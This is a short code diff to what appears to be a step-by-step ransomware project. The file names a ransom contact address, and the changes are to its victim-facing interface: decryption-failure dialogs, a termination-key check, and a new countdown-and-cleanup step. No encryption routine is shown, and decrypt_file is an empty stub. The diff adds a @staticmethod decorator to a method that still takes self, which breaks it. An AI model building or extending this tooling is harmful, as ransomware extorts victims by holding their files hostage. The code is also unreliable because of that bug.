@@ -890,6 +890,7 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
                                                        '[-] Failed to decrypt one or more files. Please check the decryption key and try again.'))
 
     # Function to Show Incomplete Decryption Message Dialog
+    @staticmethod
     def show_incomplete_message(self, decrypted_count, total_files):
         messagebox.showwarning("Decryption Incomplete",
                                f"Decryption completed for {decrypted_count} out of {total_files} files.")
@@ -944,7 +945,18 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
             messagebox.showerror("Error", "Incorrect termination key.")
             return
 
-    # TODO: Part 8 Completed, Start Part 9 => Step 44
+    """ Part 9: Implement Timer and Cleanup Methods 
+    from Step 44 to Step 56 """
+
+    # Step 44: Function to start closing countdown
+    def start_closing_countdown(self):
+        countdownDialog = CountdownDialog(self, 15, self.close_application)
+        countdownDialog.grab_set()
+        countdownDialog.mainloop()
+
+
+
+
 
     def decrypt_file(self, file_path, key):
         pass
